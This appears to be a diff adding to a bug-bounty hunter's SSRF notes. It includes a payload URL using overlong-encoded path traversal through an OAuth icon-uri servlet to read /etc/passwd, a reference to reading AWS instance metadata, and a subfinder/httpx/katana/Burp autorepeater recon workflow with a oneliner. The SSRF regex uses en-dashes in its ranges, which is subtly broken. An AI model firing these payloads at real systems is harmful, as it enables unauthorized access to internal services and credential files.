@@ -186,3 +186,21 @@ header('Location: http://127.0.0.1:8080/status');
      search for whois information
      proceeded to make the API call to read AWS instance metadata (http://169.254.169.254/latest/meta-data/ 
      check for url caching works if there, try to understand how url caching works    ////  
+     
+     https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd
+  
+   TIP//
+   1 — Get the alive subdomain from subfinder and send them to httpx
+
+2 — Open the burp suite, create a new project and set up your autorepeater with the above regex and settings like the above image.
+
+3 — Use Katana tool by projectdiscvery and use the proxy option and add the burp proxy URL by the default, it will be http://127.0.0.1:8080
+
+4 — Open the subdomain manually by the browser and visit every login page and any page you have seen on the target website you have.
+
+5 — Open the burp again and you will see the catch by the burp suite auto repeater extension, if there are any parameters to take an input like http://google.com it will change to your collab URL you have been replaced with in the autorepeater and if that no response send to your collab you will see that the autorepeater have saved the tested URL in it until you close the burp suite.
+
+ oneliner for the above
+ subfinder -d hackerone.com | httpx -timeout 10 | katana -proxy http://127.0.0.1:8080 -jc -aff 
+ 
+   regex for ssrf in autorepeter =  https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)
